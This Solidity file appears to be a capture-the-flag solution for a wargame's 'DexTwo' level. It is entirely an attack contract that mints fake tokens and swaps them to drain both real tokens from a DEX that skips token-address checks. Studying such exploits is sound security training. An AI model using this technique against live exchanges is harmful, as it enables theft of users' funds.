// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./23-DexTwo.sol";

contract DexTwoAttacker {
    DexTwo public dexTwo;

    constructor(address DexTwoAddress) public {
        dexTwo = DexTwo(DexTwoAddress);
    }

    function attack() public {
        /*
        Create new fake tokens
         */
        SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(
            address(dexTwo),
            "Fake Token 1",
            "FT1",
            100
        );
        SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(
            address(dexTwo),
            "Fake Token 2",
            "FT2",
            100
        );

        /*
        Give to the DexTwo contract ability to use our fake tokens
         */
        fakeToken1.approve(address(this), address(dexTwo), 100);
        fakeToken2.approve(address(this), address(dexTwo), 100);

        /*
        Give 1 of each tokens to DexTwo contract to 
        make liquidity
         */
        ERC20(fakeToken1).transfer(address(dexTwo), 1);
        ERC20(fakeToken2).transfer(address(dexTwo), 1);

        // Swap 1 fakeToken1 to get 100 token1
        dexTwo.swap(address(fakeToken1), dexTwo.token1(), 1);
        // Swap 1 fakeToken2 to get 100 token2
        dexTwo.swap(address(fakeToken2), dexTwo.token2(), 1);
    }
}
